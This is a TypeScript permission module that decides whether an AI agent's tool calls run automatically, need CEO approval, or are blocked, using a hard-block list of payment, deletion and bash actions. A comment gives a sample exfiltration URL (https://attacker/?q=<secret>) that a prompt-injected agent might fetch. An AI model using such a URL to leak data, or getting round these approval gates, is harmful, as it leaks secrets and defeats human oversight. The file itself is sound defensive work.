// Decides whether a tool call is auto-allowed, requires CEO approval,
// or hard-blocked. Used by the canUseTool callback in the agent runner.

import type { ToolPolicyOverride, ToolPolicyOverrides } from "./tool-policy-overrides";

/**
 * Admin allowlist for reads that leave the machine (read-allowlist.ts). A
 * read through an MCP server or Composio toolkit sends query content to that
 * provider, so it auto-runs only when the admin listed its source; otherwise
 * it asks. Internal scoped reads (profile, org brain, meeting files) never ask.
 */
export type ReadAllowlist = {
  /** Org MCP server keys (mcp__<server>__…) whose read tools auto-run. */
  servers: string[];
  /** Composio toolkit slugs (gmail, github…) whose read tools auto-run. */
  composioToolkits: string[];
  /** WebSearch sends the query to the search provider: off unless enabled. */
  webSearch: boolean;
  /** Lets a per-employee "allow" turn on WebFetch/WebSearch for that twin. */
  webOverrides: boolean;
};

export type ToolPolicyContext = { readAllowlist?: ReadAllowlist };

/** The safety-relevant subset of MCP tool annotations. */
export type McpToolAnnotations = {
  readOnlyHint?: boolean;
  destructiveHint?: boolean;
  idempotentHint?: boolean;
  openWorldHint?: boolean;
};

/**
 * The Agent SDK's canUseTool callback receives only a tool name and input, not
 * the MCP definition. Keep annotations discovered while listing SDK MCP tools
 * in-process for the lifetime of the server process.
 */
const MCP_TOOL_ANNOTATIONS = new Map<string, McpToolAnnotations>();

const mcpAnnotationKey = (toolName: string) => toolName.toLowerCase();

/** Record annotations for MCP tools discovered while listing a server. */
export function cacheMcpToolAnnotations(
  serverName: string,
  tools: Iterable<{ name?: string; annotations?: McpToolAnnotations }>,
): void {
  const prefix = `mcp__${serverName.toLowerCase()}__`;
  for (const tool of tools) {
    if (!tool.name || !tool.annotations) continue;
    MCP_TOOL_ANNOTATIONS.set(
      mcpAnnotationKey(`${prefix}${tool.name}`),
      tool.annotations,
    );
  }
}

function annotationsFor(toolName: string): McpToolAnnotations | undefined {
  return MCP_TOOL_ANNOTATIONS.get(mcpAnnotationKey(toolName));
}

/** In-process MCP servers: reads stay inside the app's own data. */
const INTERNAL_MCP_SERVERS = new Set(["org_brain", "artifacts", "meeting_scratch", "twin_consult"]);

const WEB_TOOLS = new Set(["WebFetch", "WebSearch"]);

export type ToolDecision =
  | { kind: "allow" }
  | { kind: "ask"; reason: string }
  | { kind: "block"; reason: string };

/**
 * Hard-block list — tool name patterns that should NEVER fire even with
 * approval until trust is established. Keep this short and conservative.
 */
const HARD_BLOCK_PATTERNS: RegExp[] = [
  /(?:^|_)(?:DELETE|DESTROY|REFUND|PAYMENT|CHARGE)(?:_|$)/i,
  /(?:^|_)REMOVE_USER(?:_|$)/i,
  /(?:^|_)TRANSFER_FUNDS(?:_|$)/i,
];

/**
 * Read-only patterns — auto-allow because they cannot mutate anything
 * outside the agent's own working directory.
 */
const READ_ONLY_PATTERNS: RegExp[] = [
  // Composio style (GITHUB_LIST_ISSUES) and MCP style (get_company,
  // find_projects): a read verb at the start or after a toolkit prefix.
  // The verb may also end the name (MICROSOFT_TEAMS_TEAMS_LIST).
  /(?:^|_)(?:GET|LIST|SEARCH|FETCH|RETRIEVE|READ|FIND|QUERY|DOWNLOAD|EXPORT)(?:_|$)/i,
  // Identity lookups (SLACK_WHO_AM_I, GMAIL_WHO_AM_I).
  /(?:^|_)WHO_AM_I$/i,
];

/** Composio toolkits whose slug prefix is two words. Their prefix is not a
 *  verb: "SHARE" in SHARE_POINT_SEARCH_FILES is the app, not a share action. */
const MULTI_WORD_TOOLKITS = ["SHARE_POINT", "MICROSOFT_TEAMS", "ONE_DRIVE", "GOOGLE_DRIVE", "GOOGLE_SHEETS", "GOOGLE_DOCS", "GOOGLE_CALENDAR", "GOOGLE_MEET", "ZOHO_CRM", "AZURE_DEVOPS"];

/** The toolkit a Composio action belongs to ("share_point", "gmail"). */
function toolkitOf(name: string): string {
  const upper = name.toUpperCase();
  const multi = MULTI_WORD_TOOLKITS.find((t) => upper.startsWith(`${t}_`));
  return (multi ?? name.split("_")[0] ?? "").toLowerCase();
}

/** The action part of a name, without a multi-word toolkit prefix. */
function actionOf(name: string): string {
  const upper = name.toUpperCase();
  const multi = MULTI_WORD_TOOLKITS.find((t) => upper.startsWith(`${t}_`));
  return multi ? name.slice(multi.length + 1) : name;
}

const isPureRead = (name: string) => {
  const action = actionOf(name);
  return READ_ONLY_PATTERNS.some((re) => re.test(action)) && !MUTATING_SEGMENT.test(action);
};

/** A mutating verb anywhere in the name ("get_or_create_ticket") means it is
 *  not a pure read, whatever verb comes first. */
const MUTATING_SEGMENT = /(?:^|_)(?:CREATE|UPDATE|SEND|POST|REPLY|EDIT|MODIFY|PATCH|MERGE|CLOSE|REOPEN|ASSIGN|TRANSFER|DELETE|REMOVE|WRITE|UPSERT|INSERT|SET|ADD|MOVE|INVITE|SHARE|PUBLISH|SUBMIT|APPROVE|ARCHIVE|MARK|STAR|LABEL|TAG|PIN|REACT|SNOOZE|MUTE)(?:_|$)/i;

/** Local sandbox tools the SDK exposes for agent-internal use only. */
const LOCAL_SAFE_TOOLS = new Set([
  "Read",
  "Glob",
  "Grep",
  "Write",      // path-gated to scratch/<employeeId>/ via PreToolUse hook (sdk-defaults.ts)
  // WebSearch and WebFetch are NOT here: the query or URL carries data out
  // (a prompt-injected twin could fetch https://attacker/?q=<secret>). They
  // ask unless the admin's read allowlist enables them.
  "ToolSearch", // SDK helper for tool discovery — purely internal
  "TodoWrite",  // SDK planning scratchpad — purely internal
  "StructuredOutput", // SDK's final-report tool (shift reports) — no side effects
  "Task",       // subagent dispatcher — auto-allow; the subagent's tool calls are gated separately
  "create_artifact", // local artifact renderer — UI-only, no external side effects
  // Meeting scratch — writes and reads stay inside the per-meeting disk
  // dir, never leave the host. UI-internal, no external side effects.
  "share_with_meeting",
  "read_meeting_file",
  "view_meeting_image",
  "analyze_csv",
  "query_csv",
  // Twin-to-twin consultation — purely internal orchestration (a nested twin
  // run on the same host). Loop-guarded by depth cap + visited set in
  // twin-consult.ts; request_approval additionally logs to /inbox for the
  // human to override. No external side effects of their own.
  "consult_twin",
  "request_approval",
  // Connection requests only write an Inbox item on this host. They never
  // reach the requested external system, so no approval prompt is needed.
  "request_connection",
]);

/** SDK tools that are never available to an employee twin. */
const ALWAYS_BLOCKED_TOOLS = new Set([
  "bash",
  "notebookedit",
  "enterworktree",
  "exitworktree",
]);

/** Pure verb test: a read action with no mutating segment. Says nothing
 *  about where the read goes; see classifyTool for that. */
export function isReadOnlyAction(toolName: string): boolean {
  const name = bareName(toolName);
  if (readActionPrecedesBlockedTerm(name)) return false;
  return isPureRead(name);
}

function mcpServerOf(toolName: string): string | undefined {
  return /^mcp__([a-z0-9_-]+?)__/i.exec(toolName)?.[1]?.toLowerCase();
}

/** Internal reads always; external ones only from an allowlisted source. */
function readSourceAllowed(original: string, name: string, allow: ReadAllowlist | undefined): boolean {
  const server = mcpServerOf(original);
  if (server && INTERNAL_MCP_SERVERS.has(server)) return true;
  if (!allow) return false;
  if (server && server !== "composio") return allow.servers.some((s) => s.toLowerCase() === server);
  const toolkit = toolkitOf(name);
  return allow.composioToolkits.some((t) => t.toLowerCase() === toolkit);
}

function overrideFor(
  original: string,
  name: string,
  overrides: ToolPolicyOverrides | undefined,
): ToolPolicyOverride | undefined {
  // A raw MCP name can be targeted precisely; the bare action is the useful
  // default so an override also applies when the SDK adds its MCP prefix.
  return overrides?.[original] ?? overrides?.[name];
}

/**
 * Strip the `mcp__<server>__` prefix that the Agent SDK adds to MCP tool
 * names so the classifier sees the bare Composio action name.
 *
 *   mcp__composio__GITHUB_CREATE_AN_ISSUE → GITHUB_CREATE_AN_ISSUE
 */
function bareName(toolName: string): string {
  return (toolName || "").replace(/^mcp__[a-z0-9_]+__/i, "");
}

/**
 * A read action may legitimately operate on an object called a transfer or a
 * user. In a conventional TOOLKIT_VERB_OBJECT tool name, a read verb before
 * a blocked term means that term is the object being read, not an action.
 */
function readActionPrecedesBlockedTerm(name: string): boolean {
  const parts = name.split("_");
  const readIndex = parts.findIndex((part) =>
    ["GET", "LIST", "SEARCH", "FETCH", "RETRIEVE", "READ", "FIND", "QUERY", "DOWNLOAD", "EXPORT"].includes(
      part.toUpperCase(),
    ),
  );
  const blockedIndex = parts.findIndex(
    (part, index) =>
      ["DELETE", "DESTROY", "REFUND", "PAYMENT", "CHARGE"].includes(part.toUpperCase()) ||
      (part.toUpperCase() === "REMOVE" && parts[index + 1]?.toUpperCase() === "USER") ||
      (part.toUpperCase() === "TRANSFER" && parts[index + 1]?.toUpperCase() === "FUNDS"),
  );

  return readIndex !== -1 && blockedIndex !== -1 && readIndex < blockedIndex;
}

function hardBlockDecision(name: string): ToolDecision | undefined {
  if (ALWAYS_BLOCKED_TOOLS.has(name.toLowerCase())) {
    return {
      kind: "block",
      reason: `${name} is unavailable to employee twins.`,
    };
  }

  // Preserve the read-object exception: LIST_PAYMENT_METHODS and similar
  // operations remain approval-gated rather than refused outright.
  if (readActionPrecedesBlockedTerm(name)) return undefined;

  for (const re of HARD_BLOCK_PATTERNS) {
    if (re.test(name)) {
      return {
        kind: "block",
        reason: `${name} is on the hard-block list (deletes, payments, account changes).`,
      };
    }
  }
  return undefined;
}

function matchesHardBlockPattern(name: string): boolean {
  return HARD_BLOCK_PATTERNS.some((re) => re.test(name));
}

/**
 * Classify a tool call. The agent loop should pause for "ask" decisions
 * and surface them to the CEO via the approval card; "allow" passes
 * through; "block" returns deny with a message.
 */
export function classifyTool(
  toolName: string,
  input: Record<string, unknown> | undefined,
  overrides?: ToolPolicyOverrides,
  ctx: ToolPolicyContext = {},
): ToolDecision {
  const original = toolName || "";
  const name = bareName(original); // strip mcp__server__ prefix
  const annotations = annotationsFor(original);

  // Hard blocks always win, including over a CEO's per-tool preference.
  const hardBlock = hardBlockDecision(name);
  if (hardBlock) return hardBlock;

  const override = overrideFor(original, name, overrides);
  if (override === "off") {
    return { kind: "block", reason: `${name} is disabled by this employee's tool policy.` };
  }
  if (override === "ask") {
    return { kind: "ask", reason: `${name} requires approval by this employee's tool policy.` };
  }
  // MCP servers describe this as destructive. Never let an optimistic name
  // (or an employee-level allow override) turn that into an automatic action.
  if (annotations?.destructiveHint === true) {
    return {
      kind: "ask",
      reason: `${name} is marked destructive by its MCP server. Confirm before running.`,
    };
  }
  // A permissive preference cannot turn a destructive-looking action into an
  // automatic approval. In particular, reads of transfer/removal records stay
  // in the existing cautious path below.
  // A per-employee "allow" can't open the web on its own: that needs the
  // admin's webOverrides switch.
  const webGated = WEB_TOOLS.has(name) && !ctx.readAllowlist?.webOverrides;
  if (override === "allow" && !matchesHardBlockPattern(name) && !webGated) {
    return { kind: "allow" };
  }

  // Local sandbox + SDK built-in tools never need approval.
  if (LOCAL_SAFE_TOOLS.has(original) || LOCAL_SAFE_TOOLS.has(name)) {
    return { kind: "allow" };
  }

  if (name === "WebSearch") {
    if (ctx.readAllowlist?.webSearch) return { kind: "allow" };
    const query = typeof input?.query === "string" ? (input.query as string) : "";
    return {
      kind: "ask",
      reason: query
        ? `About to search the web for "${query.slice(0, 120)}". The query goes to the search provider.`
        : "About to search the web. The query goes to the search provider.",
    };
  }

  if (name === "WebFetch") {
    const url = typeof input?.url === "string" ? (input.url as string) : "";
    return {
      kind: "ask",
      reason: url
        ? `About to fetch ${url}. A URL can carry data out — check it before allowing.`
        : "About to fetch a web page. Check the URL before allowing.",
    };
  }

  // A read verb before a blocked term usually means the term is the object
  // ("LIST_PAYMENT_METHODS"), but names like "LIST_AND_DELETE_CHARGES" also
  // match. Never auto-allow these: ask, so a human decides. Runs before the
  // hard-block scan so a genuine read isn't refused outright.
  if (readActionPrecedesBlockedTerm(name)) {
    return {
      kind: "ask",
      reason: `${name} reads data whose name looks destructive; confirm it is read-only.`,
    };
  }

  // Reads: auto only from an internal or admin-allowlisted source, because
  // the call sends query content to that provider.
  // A read-only hint is corroboration only: it cannot upgrade an action whose
  // name is not already a pure read. The normal source allowlist still applies.
  if (isPureRead(name)) {
    if (readSourceAllowed(original, name, ctx.readAllowlist)) return { kind: "allow" };
    const source = mcpServerOf(original) ?? "an external service";
    return {
      kind: "ask",
      reason: `${name} sends query content to ${source === "composio" ? `${toolkitOf(name)} (via Composio)` : source}. An admin can allowlist this source in Settings.`,
    };
  }

  // Slack — sends to channels or DMs.
  if (/SLACK_(SEND|POST|REPLY|UPDATE_MESSAGE|SCHEDULE)/i.test(name)) {
    const channel =
      typeof input?.channel === "string"
        ? (input.channel as string)
        : typeof input?.channel_name === "string"
        ? (input.channel_name as string)
        : "";
    return {
      kind: "ask",
      reason: channel
        ? `About to send a Slack message to ${channel}. Public message — review before sending.`
        : "About to send a Slack message. Review the recipient and content before sending.",
    };
  }

  // Email senders.
  if (/(GMAIL|OUTLOOK|EMAIL).*(SEND|REPLY)|SEND_EMAIL/i.test(name)) {
    const to =
      typeof input?.to === "string"
        ? (input.to as string)
        : Array.isArray(input?.to)
        ? (input.to as string[]).join(", ")
        : "";
    return {
      kind: "ask",
      reason: to
        ? `About to send an email to ${to}. External communication — review before sending.`
        : "About to send an email. Review recipient and content before sending.",
    };
  }

  // Anything that creates a tracked record — note: matches CREATE_ISSUE,
  // CREATE_AN_ISSUE, CREATE_NEW_ISSUE, CREATE_PULL_REQUEST, etc.
  if (/CREATE/i.test(name)) {
    return {
      kind: "ask",
      reason: `About to create a record via ${name}. Review the title and body before creating.`,
    };
  }

  if (/(UPDATE|EDIT|MODIFY|PATCH|MERGE|CLOSE|REOPEN|ASSIGN|TRANSFER)/i.test(name)) {
    return {
      kind: "ask",
      reason: `About to mutate existing data via ${name}. Review the change before applying.`,
    };
  }

  // Anything else that looks like a Composio action (TOOLKIT_VERB_OBJECT).
  if (/^[A-Z][A-Z0-9_]+$/.test(name) && name.includes("_")) {
    return {
      kind: "ask",
      reason: `${name} is an external action. Confirm before running.`,
    };
  }

  // Truly unrecognized — default safe: ask rather than allow.
  return {
    kind: "ask",
    reason: `${original} is an unrecognized tool. Confirm before running.`,
  };
}

/** Short human-readable description for the approval card heading. */
export function describeTool(toolName: string): string {
  // Strip mcp__composio__ prefix if present
  const stripped = toolName.replace(/^mcp__[a-z0-9_]+__/i, "");
  // SLACK_SEND_MESSAGE → "Slack: Send message"
  const parts = stripped.split("_");
  if (parts.length >= 2) {
    const toolkit = parts[0];
    const action = parts.slice(1).join(" ").toLowerCase();
    return `${toolkit.charAt(0)}${toolkit.slice(1).toLowerCase()}: ${action}`;
  }
  return stripped;
}
